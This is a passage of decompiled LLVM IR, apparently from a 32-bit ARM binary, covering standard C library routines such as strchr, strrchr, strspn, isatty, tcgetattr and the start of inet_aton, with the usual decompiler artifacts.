.dec_label_pc_17384_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %bb3, %.dec_label_pc_17384_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17384_crit_edge ], [ %v3_17370, %bb3 ]
  %v2_17384.pre-phi = sub nsw i32 %.pn, %v3_17374
  ret i32 %v2_17384.pre-phi

; uselistorder directives
  uselistorder i8 %v2_17370, { 0, 2, 1 }
  uselistorder i32 %v0_17370, { 1, 0 }
  uselistorder i32 %v0_17374, { 1, 0 }
  uselistorder label %dec_label_pc_17384, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_173f4 = urem i32 %arg1, 256
  %v0_174143 = load i32, i32* @r0, align 4
  %v1_174144 = urem i32 %v0_174143, 4
  %v2_174145 = icmp eq i32 %v1_174144, 0
  br i1 %v2_174145, label %dec_label_pc_1741c, label %dec_label_pc_173fc

dec_label_pc_173fc:                               ; preds = %entry, %dec_label_pc_17410
  %v0_17410 = phi i32 [ %v1_17410, %dec_label_pc_17410 ], [ %v0_174143, %entry ]
  %v1_173fc = inttoptr i32 %v0_17410 to i8*
  %v2_173fc = load i8, i8* %v1_173fc, align 1
  %v3_173fc = zext i8 %v2_173fc to i32
  %v9_17400 = icmp eq i32 %v3_173fc, %v1_173f4
  br i1 %v9_17400, label %dec_label_pc_174d0, label %dec_label_pc_17408

dec_label_pc_17408:                               ; preds = %dec_label_pc_173fc
  %v2_17408 = icmp eq i8 %v2_173fc, 0
  br i1 %v2_17408, label %dec_label_pc_174cc, label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %dec_label_pc_17408
  %v1_17410 = add i32 %v0_17410, 1
  %v1_17414 = urem i32 %v1_17410, 4
  %v2_17414 = icmp eq i32 %v1_17414, 0
  br i1 %v2_17414, label %dec_label_pc_1741c, label %dec_label_pc_173fc

dec_label_pc_1741c:                               ; preds = %dec_label_pc_17410, %entry
  %v0_17420 = phi i32 [ %v0_174143, %entry ], [ %v1_17410, %dec_label_pc_17410 ]
  %v4_1741c = mul nuw nsw i32 %v1_173f4, 256
  %v5_1741c = or i32 %v4_1741c, %v1_173f4
  %v4_17424 = mul i32 %v5_1741c, 65536
  %v5_17424 = or i32 %v4_17424, %v5_1741c
  br label %dec_label_pc_17428

dec_label_pc_17428:                               ; preds = %dec_label_pc_174c4, %dec_label_pc_17464, %dec_label_pc_1741c
  %v0_1748c = phi i32 [ %v0_17420, %dec_label_pc_1741c ], [ %v4_17428, %dec_label_pc_17464 ], [ %v4_17428, %dec_label_pc_174c4 ]
  %v1_17428 = inttoptr i32 %v0_1748c to i32*
  %v2_17428 = load i32, i32* %v1_17428, align 4
  %v4_17428 = add i32 %v0_1748c, 4
  %v2_17430 = xor i32 %v2_17428, %v5_17424
  %v2_1743c = add i32 %v2_17428, 2130640639
  %v1_17440 = sub i32 -1, %v2_17428
  %v2_17444 = xor i32 %v2_1743c, %v1_17440
  %v2_17450 = and i32 %v2_17444, -2130640640
  store i32 %v2_17450, i32* @r1, align 4
  %v2_17458 = icmp eq i32 %v2_17450, 0
  br i1 %v2_17458, label %dec_label_pc_17464, label %dec_label_pc_1746c

dec_label_pc_17464:                               ; preds = %dec_label_pc_17428
  %v2_17434 = add i32 %v2_17430, 2130640639
  %v1_1744c = sub i32 -1, %v2_17430
  %v2_17454 = xor i32 %v2_17434, %v1_1744c
  %v2_1745c = and i32 %v2_17454, -2130640640
  %v2_17464 = icmp eq i32 %v2_1745c, 0
  br i1 %v2_17464, label %dec_label_pc_17428, label %dec_label_pc_1746c

dec_label_pc_1746c:                               ; preds = %dec_label_pc_17428, %dec_label_pc_17464
  %v2_1746c = inttoptr i32 %v0_1748c to i8*
  %v3_1746c = load i8, i8* %v2_1746c, align 1
  %v4_1746c = zext i8 %v3_1746c to i32
  %v9_17470 = icmp eq i32 %v4_1746c, %v1_173f4
  br i1 %v9_17470, label %dec_label_pc_174d0, label %dec_label_pc_1747c

dec_label_pc_1747c:                               ; preds = %dec_label_pc_1746c
  %v2_1747c = icmp eq i8 %v3_1746c, 0
  br i1 %v2_1747c, label %dec_label_pc_174cc, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_1747c
  %v1_17484 = add i32 %v0_1748c, 1
  %v2_17484 = inttoptr i32 %v1_17484 to i8*
  %v3_17484 = load i8, i8* %v2_17484, align 1
  %v4_17484 = zext i8 %v3_17484 to i32
  %v9_17488 = icmp eq i32 %v4_17484, %v1_173f4
  br i1 %v9_17488, label %dec_label_pc_174d0, label %dec_label_pc_17494

dec_label_pc_17494:                               ; preds = %dec_label_pc_17484
  %v2_17494 = icmp eq i8 %v3_17484, 0
  br i1 %v2_17494, label %dec_label_pc_174cc, label %dec_label_pc_1749c

dec_label_pc_1749c:                               ; preds = %dec_label_pc_17494
  %v1_1749c = add i32 %v0_1748c, 2
  %v2_1749c = inttoptr i32 %v1_1749c to i8*
  %v3_1749c = load i8, i8* %v2_1749c, align 1
  %v4_1749c = zext i8 %v3_1749c to i32
  %v9_174a0 = icmp eq i32 %v4_1749c, %v1_173f4
  br i1 %v9_174a0, label %dec_label_pc_174d0, label %dec_label_pc_174ac

dec_label_pc_174ac:                               ; preds = %dec_label_pc_1749c
  %v2_174ac = icmp eq i8 %v3_1749c, 0
  br i1 %v2_174ac, label %dec_label_pc_174cc, label %dec_label_pc_174b4

dec_label_pc_174b4:                               ; preds = %dec_label_pc_174ac
  %v1_174b4 = add i32 %v0_1748c, 3
  %v2_174b4 = inttoptr i32 %v1_174b4 to i8*
  %v3_174b4 = load i8, i8* %v2_174b4, align 1
  %v4_174b4 = zext i8 %v3_174b4 to i32
  %v9_174b8 = icmp eq i32 %v4_174b4, %v1_173f4
  br i1 %v9_174b8, label %dec_label_pc_174d0, label %dec_label_pc_174c4

dec_label_pc_174c4:                               ; preds = %dec_label_pc_174b4
  %v2_174c4 = icmp eq i8 %v3_174b4, 0
  br i1 %v2_174c4, label %dec_label_pc_174cc, label %dec_label_pc_17428

dec_label_pc_174cc:                               ; preds = %dec_label_pc_17408, %dec_label_pc_174c4, %dec_label_pc_174ac, %dec_label_pc_17494, %dec_label_pc_1747c
  br label %dec_label_pc_174d0

dec_label_pc_174d0:                               ; preds = %dec_label_pc_173fc, %dec_label_pc_174b4, %dec_label_pc_1749c, %dec_label_pc_17484, %dec_label_pc_1746c, %dec_label_pc_174cc
  %v1_174d4 = phi i32 [ 0, %dec_label_pc_174cc ], [ %v1_174b4, %dec_label_pc_174b4 ], [ %v1_1749c, %dec_label_pc_1749c ], [ %v1_17484, %dec_label_pc_17484 ], [ %v0_1748c, %dec_label_pc_1746c ], [ %v0_17410, %dec_label_pc_173fc ]
  ret i32 %v1_174d4

; uselistorder directives
  uselistorder i32 %v4_17428, { 1, 0 }
  uselistorder i32 %v2_17428, { 0, 2, 1 }
  uselistorder i32 %v0_1748c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1741c, { 1, 0 }
  uselistorder i32 %v1_17410, { 1, 0, 2 }
  uselistorder i32 %v0_174143, { 2, 1, 0 }
  uselistorder i32 %v1_173f4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_174d0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_174cc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1746c, { 1, 0 }
  uselistorder label %dec_label_pc_173fc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_174e4 = urem i32 %arg1, 256
  %v0_175042 = load i32, i32* @r0, align 4
  %v1_175043 = urem i32 %v0_175042, 4
  %v2_175044 = icmp eq i32 %v1_175043, 0
  br i1 %v2_175044, label %dec_label_pc_1750c, label %dec_label_pc_174ec

dec_label_pc_174ec:                               ; preds = %entry, %dec_label_pc_17500
  %v0_17500 = phi i32 [ %v1_17500, %dec_label_pc_17500 ], [ %v0_175042, %entry ]
  %v1_174ec = inttoptr i32 %v0_17500 to i8*
  %v2_174ec = load i8, i8* %v1_174ec, align 1
  %v3_174ec = zext i8 %v2_174ec to i32
  %v9_174f0 = icmp eq i32 %v3_174ec, %v1_174e4
  br i1 %v9_174f0, label %dec_label_pc_175bc, label %dec_label_pc_174f8

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174ec
  %v2_174f8 = icmp eq i8 %v2_174ec, 0
  br i1 %v2_174f8, label %dec_label_pc_175bc, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f8
  %v1_17500 = add i32 %v0_17500, 1
  %v1_17504 = urem i32 %v1_17500, 4
  %v2_17504 = icmp eq i32 %v1_17504, 0
  br i1 %v2_17504, label %dec_label_pc_1750c, label %dec_label_pc_174ec

dec_label_pc_1750c:                               ; preds = %dec_label_pc_17500, %entry
  %v0_17510 = phi i32 [ %v0_175042, %entry ], [ %v1_17500, %dec_label_pc_17500 ]
  %v4_1750c = mul nuw nsw i32 %v1_174e4, 256
  %v5_1750c = or i32 %v4_1750c, %v1_174e4
  %v4_17514 = mul i32 %v5_1750c, 65536
  %v5_17514 = or i32 %v4_17514, %v5_1750c
  br label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_175b4, %dec_label_pc_17554, %dec_label_pc_1750c
  %v0_1757c = phi i32 [ %v0_17510, %dec_label_pc_1750c ], [ %v4_17518, %dec_label_pc_17554 ], [ %v4_17518, %dec_label_pc_175b4 ]
  %v1_17518 = inttoptr i32 %v0_1757c to i32*
  %v2_17518 = load i32, i32* %v1_17518, align 4
  %v4_17518 = add i32 %v0_1757c, 4
  %v2_17520 = xor i32 %v2_17518, %v5_17514
  %v2_1752c = add i32 %v2_17518, 2130640639
  %v1_17530 = sub i32 -1, %v2_17518
  %v2_17534 = xor i32 %v2_1752c, %v1_17530
  %v2_17540 = and i32 %v2_17534, -2130640640
  store i32 %v2_17540, i32* @r1, align 4
  %v2_17548 = icmp eq i32 %v2_17540, 0
  br i1 %v2_17548, label %dec_label_pc_17554, label %dec_label_pc_1755c

dec_label_pc_17554:                               ; preds = %dec_label_pc_17518
  %v2_17524 = add i32 %v2_17520, 2130640639
  %v1_1753c = sub i32 -1, %v2_17520
  %v2_17544 = xor i32 %v2_17524, %v1_1753c
  %v2_1754c = and i32 %v2_17544, -2130640640
  %v2_17554 = icmp eq i32 %v2_1754c, 0
  br i1 %v2_17554, label %dec_label_pc_17518, label %dec_label_pc_1755c

dec_label_pc_1755c:                               ; preds = %dec_label_pc_17518, %dec_label_pc_17554
  %v2_1755c = inttoptr i32 %v0_1757c to i8*
  %v3_1755c = load i8, i8* %v2_1755c, align 1
  %v4_1755c = zext i8 %v3_1755c to i32
  %v9_17560 = icmp eq i32 %v4_1755c, %v1_174e4
  br i1 %v9_17560, label %dec_label_pc_175bc, label %dec_label_pc_1756c

dec_label_pc_1756c:                               ; preds = %dec_label_pc_1755c
  %v2_1756c = icmp eq i8 %v3_1755c, 0
  br i1 %v2_1756c, label %dec_label_pc_175bc, label %dec_label_pc_17574

dec_label_pc_17574:                               ; preds = %dec_label_pc_1756c
  %v1_17574 = add i32 %v0_1757c, 1
  %v2_17574 = inttoptr i32 %v1_17574 to i8*
  %v3_17574 = load i8, i8* %v2_17574, align 1
  %v4_17574 = zext i8 %v3_17574 to i32
  %v9_17578 = icmp eq i32 %v4_17574, %v1_174e4
  br i1 %v9_17578, label %dec_label_pc_175bc, label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_17574
  %v2_17584 = icmp eq i8 %v3_17574, 0
  br i1 %v2_17584, label %dec_label_pc_175bc, label %dec_label_pc_1758c

dec_label_pc_1758c:                               ; preds = %dec_label_pc_17584
  %v1_1758c = add i32 %v0_1757c, 2
  %v2_1758c = inttoptr i32 %v1_1758c to i8*
  %v3_1758c = load i8, i8* %v2_1758c, align 1
  %v4_1758c = zext i8 %v3_1758c to i32
  %v9_17590 = icmp eq i32 %v4_1758c, %v1_174e4
  br i1 %v9_17590, label %dec_label_pc_175bc, label %dec_label_pc_1759c

dec_label_pc_1759c:                               ; preds = %dec_label_pc_1758c
  %v2_1759c = icmp eq i8 %v3_1758c, 0
  br i1 %v2_1759c, label %dec_label_pc_175bc, label %dec_label_pc_175a4

dec_label_pc_175a4:                               ; preds = %dec_label_pc_1759c
  %v1_175a4 = add i32 %v0_1757c, 3
  %v2_175a4 = inttoptr i32 %v1_175a4 to i8*
  %v3_175a4 = load i8, i8* %v2_175a4, align 1
  %v4_175a4 = zext i8 %v3_175a4 to i32
  %v9_175a8 = icmp eq i32 %v4_175a4, %v1_174e4
  br i1 %v9_175a8, label %dec_label_pc_175bc, label %dec_label_pc_175b4

dec_label_pc_175b4:                               ; preds = %dec_label_pc_175a4
  %v2_175b4 = icmp eq i8 %v3_175a4, 0
  br i1 %v2_175b4, label %dec_label_pc_175bc, label %dec_label_pc_17518

dec_label_pc_175bc:                               ; preds = %dec_label_pc_174f8, %dec_label_pc_174ec, %dec_label_pc_175b4, %dec_label_pc_175a4, %dec_label_pc_1759c, %dec_label_pc_1758c, %dec_label_pc_17584, %dec_label_pc_17574, %dec_label_pc_1756c, %dec_label_pc_1755c
  %v1_175c0 = phi i32 [ %v1_175a4, %dec_label_pc_175b4 ], [ %v1_175a4, %dec_label_pc_175a4 ], [ %v1_1758c, %dec_label_pc_1759c ], [ %v1_1758c, %dec_label_pc_1758c ], [ %v1_17574, %dec_label_pc_17584 ], [ %v1_17574, %dec_label_pc_17574 ], [ %v0_1757c, %dec_label_pc_1756c ], [ %v0_1757c, %dec_label_pc_1755c ], [ %v0_17500, %dec_label_pc_174ec ], [ %v0_17500, %dec_label_pc_174f8 ]
  ret i32 %v1_175c0

; uselistorder directives
  uselistorder i32 %v4_17518, { 1, 0 }
  uselistorder i32 %v2_17518, { 0, 2, 1 }
  uselistorder i32 %v0_1757c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1750c, { 1, 0 }
  uselistorder i32 %v1_17500, { 1, 0, 2 }
  uselistorder i32 %v0_175042, { 2, 1, 0 }
  uselistorder i32 %v1_174e4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_175bc, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1755c, { 1, 0 }
  uselistorder label %dec_label_pc_174ec, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_175cc = load i32, i32* @r4, align 4
  store i32 %v3_175cc, i32* %stack_var_-16, align 4
  %v6_175cc = load i32, i32* @r5, align 4
  %v9_175cc = load i32, i32* @r6, align 4
  %v0_175d0 = load i32, i32* @r0, align 4
  %v0_175d4 = load i32, i32* @r1, align 4
  store i32 %v0_175d4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_175f08 = inttoptr i32 %v0_175d0 to i8*
  %v2_175f09 = load i8, i8* %v1_175f08, align 1
  %v3_175f010 = zext i8 %v2_175f09 to i32
  store i32 %v3_175f010, i32* @r1, align 4
  %v2_175f411 = icmp eq i8 %v2_175f09, 0
  store i32 %v0_175d4, i32* @r0, align 4
  %v1_175fc12 = add i32 %v0_175d0, 1
  store i32 %v1_175fc12, i32* @r4, align 4
  br i1 %v2_175f411, label %dec_label_pc_17604, label %dec_label_pc_175e0

dec_label_pc_175e0:                               ; preds = %entry, %dec_label_pc_175ec
  %v3_175f014 = phi i32 [ %v3_175f0, %dec_label_pc_175ec ], [ %v3_175f010, %entry ]
  %v0_175f813 = phi i32 [ %v0_175f8.pre, %dec_label_pc_175ec ], [ %v0_175d4, %entry ]
  %v2_175e0 = call i32 @__GI_strchr(i32 %v0_175f813, i32 %v3_175f014)
  %v2_175e4 = icmp eq i32 %v2_175e0, 0
  %v0_175ec = load i32, i32* @r5, align 4
  br i1 %v2_175e4, label %dec_label_pc_175ec, label %dec_label_pc_17604

dec_label_pc_175ec:                               ; preds = %dec_label_pc_175e0
  %v1_175ec = add i32 %v0_175ec, 1
  %v0_175f0.pre = load i32, i32* @r4, align 4
  %v0_175f8.pre = load i32, i32* @r6, align 4
  store i32 %v1_175ec, i32* @r5, align 4
  %v1_175f0 = inttoptr i32 %v0_175f0.pre to i8*
  %v2_175f0 = load i8, i8* %v1_175f0, align 1
  %v3_175f0 = zext i8 %v2_175f0 to i32
  store i32 %v3_175f0, i32* @r1, align 4
  %v2_175f4 = icmp eq i8 %v2_175f0, 0
  store i32 %v0_175f8.pre, i32* @r0, align 4
  %v1_175fc = add i32 %v0_175f0.pre, 1
  store i32 %v1_175fc, i32* @r4, align 4
  br i1 %v2_175f4, label %dec_label_pc_17604, label %dec_label_pc_175e0

dec_label_pc_17604:                               ; preds = %dec_label_pc_175ec, %dec_label_pc_175e0, %entry
  %v0_17604 = phi i32 [ 0, %entry ], [ %v0_175ec, %dec_label_pc_175e0 ], [ %v1_175ec, %dec_label_pc_175ec ]
  %v2_17608 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17608, i32* @r4, align 4
  store i32 %v6_175cc, i32* @r5, align 4
  store i32 %v9_175cc, i32* @r6, align 4
  ret i32 %v0_17604

; uselistorder directives
  uselistorder i32 %v3_175f0, { 1, 0 }
  uselistorder i32 %v0_175f8.pre, { 1, 0 }
  uselistorder i32 %v0_175f0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_175e0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17614 = urem i32 %arg2, 256
  store i32 %v1_17614, i32* @r4, align 4
  %v2_17614 = icmp eq i32 %v1_17614, 0
  br i1 %v2_17614, label %dec_label_pc_17628, label %dec_label_pc_1763c.preheader

dec_label_pc_1763c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_176443 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17614)
  %v2_176485 = icmp eq i32 %v2_176443, 0
  br i1 %v2_176485, label %dec_label_pc_17650, label %dec_label_pc_17634

dec_label_pc_17628:                               ; preds = %entry
  %v2_1762c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17654

dec_label_pc_17634:                               ; preds = %dec_label_pc_1763c.preheader, %dec_label_pc_17634
  %v2_176446 = phi i32 [ %v2_17644, %dec_label_pc_17634 ], [ %v2_176443, %dec_label_pc_1763c.preheader ]
  store i32 %v2_176446, i32* @r5, align 4
  %v1_17638 = add i32 %v2_176446, 1
  store i32 %v1_17638, i32* @r0, align 4
  %v0_17640 = load i32, i32* @r4, align 4
  %v2_17644 = call i32 @__GI_strchr(i32 %v1_17638, i32 %v0_17640)
  %v2_17648 = icmp eq i32 %v2_17644, 0
  br i1 %v2_17648, label %dec_label_pc_17650, label %dec_label_pc_17634

dec_label_pc_17650:                               ; preds = %dec_label_pc_17634, %dec_label_pc_1763c.preheader
  %v0_17650 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17654

dec_label_pc_17654:                               ; preds = %dec_label_pc_17628, %dec_label_pc_17650
  %storemerge = phi i32 [ %v2_1762c, %dec_label_pc_17628 ], [ %v0_17650, %dec_label_pc_17650 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17644, { 1, 0 }
  uselistorder i32 %v1_17638, { 1, 0 }
  uselistorder i32 %v1_17614, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17654, { 1, 0 }
  uselistorder label %dec_label_pc_17634, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_176902 = load i32, i32* @r0, align 4
  %v1_176903 = inttoptr i32 %v0_176902 to i8*
  %v2_176904 = load i8, i8* %v1_176903, align 1
  %v2_176946 = icmp eq i8 %v2_176904, 0
  br i1 %v2_176946, label %dec_label_pc_176a0, label %dec_label_pc_17674.preheader

dec_label_pc_1766c:                               ; preds = %dec_label_pc_17674
  %v1_1767c = add i32 %v0_1767c, 1
  %v9_1766c = icmp eq i8 %v0_1766c10.in, %v2_17674
  br i1 %v9_1766c, label %dec_label_pc_17688, label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %dec_label_pc_17674.preheader, %dec_label_pc_1766c
  %v0_1767c = phi i32 [ %tmp, %dec_label_pc_17674.preheader ], [ %v1_1767c, %dec_label_pc_1766c ]
  %v1_17674 = inttoptr i32 %v0_1767c to i8*
  %v2_17674 = load i8, i8* %v1_17674, align 1
  %v2_17678 = icmp eq i8 %v2_17674, 0
  br i1 %v2_17678, label %dec_label_pc_176a0, label %dec_label_pc_1766c

dec_label_pc_17688:                               ; preds = %dec_label_pc_1766c
  %v1_17688 = add i32 %v0_17688, 1
  %v1_1768c = add i32 %v0_1768c, 1
  %v1_17690 = inttoptr i32 %v1_1768c to i8*
  %v2_17690 = load i8, i8* %v1_17690, align 1
  %v2_17694 = icmp eq i8 %v2_17690, 0
  br i1 %v2_17694, label %dec_label_pc_176a0, label %dec_label_pc_17674.preheader

dec_label_pc_17674.preheader:                     ; preds = %entry, %dec_label_pc_17688
  %v0_1768c = phi i32 [ %v1_1768c, %dec_label_pc_17688 ], [ %v0_176902, %entry ]
  %v0_17688 = phi i32 [ %v1_17688, %dec_label_pc_17688 ], [ 0, %entry ]
  %v0_1766c10.in = phi i8 [ %v2_17690, %dec_label_pc_17688 ], [ %v2_176904, %entry ]
  br label %dec_label_pc_17674

dec_label_pc_176a0:                               ; preds = %dec_label_pc_17688, %dec_label_pc_17674, %entry
  %v0_176a0 = phi i32 [ 0, %entry ], [ %v0_17688, %dec_label_pc_17674 ], [ %v1_17688, %dec_label_pc_17688 ]
  ret i32 %v0_176a0

; uselistorder directives
  uselistorder i8 %v2_17674, { 1, 0 }
  uselistorder i32 %v0_1767c, { 1, 0 }
  uselistorder label %dec_label_pc_17674.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_176b4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_176b4, i32* @r1, align 4
  %v0_176b8 = call i32 @__GI_tcgetattr()
  %v1_176bc = sub i32 1, %v0_176b8
  %v2_176bc = icmp ult i32 %v0_176b8, 2
  br i1 %v2_176bc, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_176cc = phi i32 [ %v1_176bc, %entry ], [ 0, %bb ]
  ret i32 %v1_176cc

; uselistorder directives
  uselistorder i32 %v0_176b8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_176d0 = load i32, i32* @r4, align 4
  %v6_176d0 = load i32, i32* @r5, align 4
  %v9_176d0 = load i32, i32* @r6, align 4
  %v2_176d8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_176dc = load i32, i32* @r1, align 4
  store i32 %v0_176dc, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_176e8 = load i32, i32* @r0, align 4
  %v3_176e8 = call i32 @ioctl(i32 %v0_176e8, i32 21505, i32 %v2_176d8)
  store i32 %v3_176e8, i32* %r0.global-to-local, align 4
  store i32 %v3_176e8, i32* @r5, align 4
  %v2_176ec = icmp eq i32 %v3_176e8, 0
  br i1 %v2_176ec, label %dec_label_pc_176f4, label %dec_label_pc_17738

dec_label_pc_176f4:                               ; preds = %entry
  %v4_17700 = zext i8 %tmp to i32
  store i32 %v4_17700, i32* @ip, align 4
  %v3_17704 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17704, i32* @r3, align 4
  %v1_17708 = load i32, i32* @r4, align 4
  %v2_17708 = add i32 %v1_17708, 4
  %v3_17708 = inttoptr i32 %v2_17708 to i32*
  %v0_1770c = load i32, i32* %r1.global-to-local, align 4
  %v1_1770c = load i32, i32* @r4, align 4
  %v2_1770c = add i32 %v1_1770c, 8
  %v3_1770c = inttoptr i32 %v2_1770c to i32*
  store i32 %v0_1770c, i32* %v3_1770c, align 4
  %v0_17710 = load i32, i32* %r0.global-to-local, align 4
  %v1_17710 = load i32, i32* @r4, align 4
  %v2_17710 = add i32 %v1_17710, 12
  %v3_17710 = inttoptr i32 %v2_17710 to i32*
  store i32 %v0_17710, i32* %v3_17710, align 4
  %v2_17714 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17714, i32* @r1, align 4
  %v1_1771c = load i32, i32* @r4, align 4
  %v2_1771c = inttoptr i32 %v1_1771c to i32*
  store i32 %v3_17704, i32* %v2_1771c, align 4
  %v0_17720 = load i32, i32* @ip, align 4
  %v1_17720 = trunc i32 %v0_17720 to i8
  %v2_17720 = load i32, i32* @r4, align 4
  %v3_17720 = add i32 %v2_17720, 16
  %v4_17720 = inttoptr i32 %v3_17720 to i8*
  store i8 %v1_17720, i8* %v4_17720, align 1
  %v0_17724 = load i32, i32* @r4, align 4
  %v1_17724 = add i32 %v0_17724, 17
  store i32 %v1_17724, i32* %r0.global-to-local, align 4
  %v4_17728 = call i32 @__GI_mempcpy(i32 %v1_17724, i32 %v2_17714, i32 19, i32 %v3_17704)
  store i32 %v4_17728, i32* %r0.global-to-local, align 4
  %v0_1772c = load i32, i32* @r5, align 4
  store i32 %v0_1772c, i32* %r1.global-to-local, align 4
  %v3_17734 = inttoptr i32 %v4_17728 to i8*
  %v4_17734 = call i32 @__GI_memset(i8* %v3_17734, i32 %v0_1772c, i32 13)
  store i32 %v4_17734, i32* %r0.global-to-local, align 4
  %v0_17738.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17738

dec_label_pc_17738:                               ; preds = %entry, %dec_label_pc_176f4
  %v0_17738 = phi i32 [ %v3_176e8, %entry ], [ %v0_17738.pre, %dec_label_pc_176f4 ]
  store i32 %v0_17738, i32* %r0.global-to-local, align 4
  store i32 %v3_176d0, i32* @r4, align 4
  store i32 %v6_176d0, i32* @r5, align 4
  store i32 %v9_176d0, i32* @r6, align 4
  ret i32 %v0_17738

; uselistorder directives
  uselistorder i32 %v0_17738, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 15, 1, 4, 18, 19, 16, 17, 5, 6, 7, 8, 9, 10, 20, 11, 21, 12, 22, 23, 13, 24, 14, 2, 25, 3, 26, 27, 28, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17738, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1774c = load i32, i32* @r4, align 4
  store i32 %v3_1774c, i32* %stack_var_-28, align 4
  %v0_17754 = load i32, i32* @r0, align 4
  %v2_17754 = icmp eq i32 %v0_17754, 0
  %v0_1775c = load i32, i32* @r1, align 4
  br i1 %v2_17754, label %dec_label_pc_17830, label %dec_label_pc_17764

dec_label_pc_17764:                               ; preds = %entry
  br label %dec_label_pc_1777c

dec_label_pc_1777c:                               ; preds = %dec_label_pc_17764, %dec_label_pc_177f4
  %v1_177f4 = phi i32 [ 0, %dec_label_pc_17764 ], [ %v5_177f4, %dec_label_pc_177f4 ]
  %v0_177f8 = phi i32 [ 1, %dec_label_pc_17764 ], [ %v1_177f8, %dec_label_pc_177f4 ]
  %v0_1777c = phi i32 [ %v0_17754, %dec_label_pc_17764 ], [ %v0_1777c13, %dec_label_pc_177f4 ]
  %v1_1777c = inttoptr i32 %v0_1777c to i8*
  %v2_1777c = load i8, i8* %v1_1777c, align 1
  %v3_1777c = zext i8 %v2_1777c to i32
  %v4_17780 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 276) to i32*), align 4
  %v2_17784 = mul nuw nsw i32 %v3_1777c, 2
  %v2_17788 = add i32 %v2_17784, %v4_17780
  %v3_17788 = inttoptr i32 %v2_17788 to i16*
  %v4_17788 = load i16, i16* %v3_17788, align 2
  %v1_1778c = and i16 %v4_17788, 8
  %v2_1778c = icmp eq i16 %v1_1778c, 0
  br i1 %v2_1778c, label %dec_label_pc_17830, label %dec_label_pc_17794

dec_label_pc_17794:                               ; preds = %dec_label_pc_1777c
  br label %dec_label_pc_177b4

dec_label_pc_1779c:                               ; preds = %dec_label_pc_177b4
  %v2_1779c = mul i32 %v0_177f4, 10
  %v1_177a0 = add i32 %v2_1779c, -48
  %v2_177a4 = add i32 %v3_177b4, %v1_177a0
  %v8_177ac = icmp sgt i32 %v2_177a4, 255
  br i1 %v8_177ac, label %dec_label_pc_17830, label %dec_label_pc_177b0

dec_label_pc_177b0:                               ; preds = %dec_label_pc_1779c
  %v1_177b0 = add i32 %v0_177e4, 1
